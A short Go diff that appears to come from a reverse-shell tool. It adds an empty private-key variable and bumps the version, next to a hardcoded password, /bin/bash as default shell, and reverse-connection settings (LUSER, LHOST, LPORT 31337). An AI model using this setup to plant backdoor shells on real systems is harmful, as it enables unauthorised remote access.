@@ -24,8 +24,9 @@ import (
 var (
 	localPassword = "letmeinbrudipls"
 	authorizedKey = ""
+	privateKey    = ""
 	defaultShell  = "/bin/bash"
-	version       = "1.3.0-dev"
+	version       = "1.3.1"
 	LUSER         = "reverse"
 	LHOST         = ""
 	LPORT         = "31337"
